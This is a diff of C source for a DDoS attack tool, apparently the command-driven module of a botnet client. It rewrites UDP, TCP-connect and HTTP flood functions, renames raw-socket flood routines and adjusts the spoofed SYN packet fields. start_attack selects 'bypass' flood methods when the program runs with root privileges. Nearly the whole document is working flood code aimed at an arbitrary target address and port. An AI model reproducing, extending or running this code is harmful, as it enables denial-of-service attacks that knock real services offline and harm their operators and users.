@@ -33,7 +33,6 @@
 #define DEFAULT_SIZE 1400
 #define DEFAULT_PPS 100000
 #define DEFAULT_DELAY 1
-#define SOCKETS_PER_THREAD 4
 
 static int sock = -1;
 static int running = 1;
@@ -207,77 +206,12 @@ void *udp_flood(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
     int sockfd;
     struct sockaddr_in target_addr;
-    unsigned char *packet;
-    time_t end_time;
-    int sent_count = 0;
-
-    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sockfd < 0) {
-        return NULL;
-    }
-
-    int bufsize = 1024 * 1024 * 16;
-    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
-
-    target_addr.sin_family = AF_INET;
-    target_addr.sin_port = htons(args->port);
-    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
-        close(sockfd);
-        return NULL;
-    }
-
-    packet = malloc(args->packet_size);
-    end_time = time(NULL) + args->duration;
-    int delay_us = 1000000 / args->pps;
-    if (delay_us < 1) delay_us = 1;
-
-    while (attack_running && time(NULL) < end_time) {
-        random_payload(packet, args->packet_size);
-        
-        int result = sendto(sockfd, packet, args->packet_size, 0,
-                           (struct sockaddr *)&target_addr, sizeof(target_addr));
-        
-        if (result > 0) {
-            packets_sent++;
-            bytes_sent += result;
-            sent_count++;
-        }
-
-        if (args->threads > 1) {
-            for (int i = 1; i < args->threads; i++) {
-                random_payload(packet, args->packet_size);
-                result = sendto(sockfd, packet, args->packet_size, 0,
-                               (struct sockaddr *)&target_addr, sizeof(target_addr));
-                if (result > 0) {
-                    packets_sent++;
-                    bytes_sent += result;
-                    sent_count++;
-                }
-            }
-        }
-
-        if (args->delay > 0) {
-            usleep(args->delay);
-        } else {
-            usleep(delay_us);
-        }
-    }
-
-    free(packet);
-    close(sockfd);
-    return NULL;
-}
-
-void *tcp_flood(void *arg) {
-    attack_args_t *args = (attack_args_t *)arg;
-    int sockfd;
-    struct sockaddr_in target_addr;
     char packet[MAX_PACKET];
     int packet_size;
     time_t end_time;
     int sent_count = 0;
 
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd < 0) {
         return NULL;
     }
@@ -336,6 +270,78 @@ void *tcp_flood(void *arg) {
     return NULL;
 }
 
+void *tcp_flood(void *arg) {
+    attack_args_t *args = (attack_args_t *)arg;
+    int sockfd;
+    struct sockaddr_in target_addr;
+    char packet[MAX_PACKET];
+    int packet_size;
+    time_t end_time;
+    int sent_count = 0;
+
+    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sockfd < 0) {
+        return NULL;
+    }
+
+    int bufsize = 1024 * 1024 * 16;
+    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
+
+    target_addr.sin_family = AF_INET;
+    target_addr.sin_port = htons(args->port);
+    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
+        close(sockfd);
+        return NULL;
+    }
+
+    packet_size = args->packet_size;
+    if (packet_size > 65535) packet_size = 65535;
+    if (packet_size < 64) packet_size = 64;
+
+    end_time = time(NULL) + args->duration;
+    int delay_us = 1000000 / args->pps;
+    if (delay_us < 1) delay_us = 1;
+
+    while (attack_running && time(NULL) < end_time) {
+        int conn = socket(AF_INET, SOCK_STREAM, 0);
+        if (conn >= 0) {
+            fcntl(conn, F_SETFL, O_NONBLOCK);
+            connect(conn, (struct sockaddr *)&target_addr, sizeof(target_addr));
+            random_payload((unsigned char *)packet, packet_size);
+            send(conn, packet, packet_size, 0);
+            close(conn);
+            packets_sent++;
+            bytes_sent += packet_size;
+            sent_count++;
+        }
+
+        if (args->threads > 1) {
+            for (int i = 1; i < args->threads; i++) {
+                int conn2 = socket(AF_INET, SOCK_STREAM, 0);
+                if (conn2 >= 0) {
+                    fcntl(conn2, F_SETFL, O_NONBLOCK);
+                    connect(conn2, (struct sockaddr *)&target_addr, sizeof(target_addr));
+                    random_payload((unsigned char *)packet, packet_size);
+                    send(conn2, packet, packet_size, 0);
+                    close(conn2);
+                    packets_sent++;
+                    bytes_sent += packet_size;
+                    sent_count++;
+                }
+            }
+        }
+
+        if (args->delay > 0) {
+            usleep(args->delay);
+        } else {
+            usleep(delay_us);
+        }
+    }
+
+    close(sockfd);
+    return NULL;
+}
+
 void *http_flood(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
     int sockfd;
@@ -367,23 +373,28 @@ void *http_flood(void *arg) {
     while (attack_running && time(NULL) < end_time) {
         build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
         
-        int result = sendto(sockfd, http_request, strlen(http_request), 0,
-                           (struct sockaddr *)&target_addr, sizeof(target_addr));
-        
-        if (result > 0) {
+        int conn = socket(AF_INET, SOCK_STREAM, 0);
+        if (conn >= 0) {
+            fcntl(conn, F_SETFL, O_NONBLOCK);
+            connect(conn, (struct sockaddr *)&target_addr, sizeof(target_addr));
+            send(conn, http_request, strlen(http_request), 0);
+            close(conn);
             packets_sent++;
-            bytes_sent += result;
+            bytes_sent += strlen(http_request);
             sent_count++;
         }
 
         if (args->threads > 1) {
             for (int i = 1; i < args->threads; i++) {
                 build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
-                result = sendto(sockfd, http_request, strlen(http_request), 0,
-                               (struct sockaddr *)&target_addr, sizeof(target_addr));
-                if (result > 0) {
+                int conn2 = socket(AF_INET, SOCK_STREAM, 0);
+                if (conn2 >= 0) {
+                    fcntl(conn2, F_SETFL, O_NONBLOCK);
+                    connect(conn2, (struct sockaddr *)&target_addr, sizeof(target_addr));
+                    send(conn2, http_request, strlen(http_request), 0);
+                    close(conn2);
                     packets_sent++;
-                    bytes_sent += result;
+                    bytes_sent += strlen(http_request);
                     sent_count++;
                 }
             }
@@ -400,7 +411,7 @@ void *http_flood(void *arg) {
     return NULL;
 }
 
-void *raw_udp_flood(void *arg) {
+void *udp_raw_flood(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
     int sockfd;
     char packet[MAX_PACKET];
@@ -479,9 +490,6 @@ void *raw_udp_flood(void *arg) {
                 close(sockfd);
                 return NULL;
             }
-            if (error_count < 10) {
-                usleep(1000);
-            }
         }
 
         if (args->threads > 1) {
@@ -531,7 +539,7 @@ void *raw_udp_flood(void *arg) {
     return NULL;
 }
 
-void *raw_tcp_flood(void *arg) {
+void *tcp_raw_flood(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
     int sockfd;
     char packet[MAX_PACKET];
@@ -589,7 +597,7 @@ void *raw_tcp_flood(void *arg) {
         tcp_header->source = htons(1024 + (rand() % 64511));
         tcp_header->dest = htons(args->port);
         tcp_header->seq = rand();
-        tcp_header->ack_seq = rand();
+        tcp_header->ack_seq = 0;
         tcp_header->doff = 5;
         tcp_header->syn = 1;
         tcp_header->window = htons(65535);
@@ -627,7 +635,7 @@ void *raw_tcp_flood(void *arg) {
                 tcp_header->source = htons(1024 + (rand() % 64511));
                 tcp_header->dest = htons(args->port);
                 tcp_header->seq = rand();
-                tcp_header->ack_seq = rand();
+                tcp_header->ack_seq = 0;
                 tcp_header->doff = 5;
                 tcp_header->syn = 1;
                 tcp_header->window = htons(65535);
@@ -657,7 +665,7 @@ void *raw_tcp_flood(void *arg) {
     return NULL;
 }
 
-void *raw_http_flood(void *arg) {
+void *http_raw_flood(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
     int sockfd;
     char packet[MAX_PACKET];
@@ -728,7 +736,7 @@ void *raw_http_flood(void *arg) {
         tcp_header->source = htons(1024 + (rand() % 64511));
         tcp_header->dest = htons(args->port);
         tcp_header->seq = rand();
-        tcp_header->ack_seq = rand();
+        tcp_header->ack_seq = 0;
         tcp_header->doff = 5;
         tcp_header->syn = 1;
         tcp_header->window = htons(65535);
@@ -776,7 +784,7 @@ void *raw_http_flood(void *arg) {
                 tcp_header->source = htons(1024 + (rand() % 64511));
                 tcp_header->dest = htons(args->port);
                 tcp_header->seq = rand();
-                tcp_header->ack_seq = rand();
+                tcp_header->ack_seq = 0;
                 tcp_header->doff = 5;
                 tcp_header->syn = 1;
                 tcp_header->window = htons(65535);
@@ -882,13 +890,13 @@ void start_attack(char *cmd) {
     
     if (is_root) {
         if (strcasecmp(method, "udp-bypass") == 0 || strcasecmp(method, "udp") == 0) {
-            attack_func = raw_udp_flood;
+            attack_func = udp_raw_flood;
             strcpy(actual_method, "udp-raw");
         } else if (strcasecmp(method, "tcp-bypass") == 0 || strcasecmp(method, "tcp") == 0) {
-            attack_func = raw_tcp_flood;
+            attack_func = tcp_raw_flood;
             strcpy(actual_method, "tcp-raw");
         } else if (strcasecmp(method, "http-bypass") == 0 || strcasecmp(method, "http") == 0) {
-            attack_func = raw_http_flood;
+            attack_func = http_raw_flood;
             strcpy(current_attack.path, "/");
             strcpy(actual_method, "http-raw");
         } else {
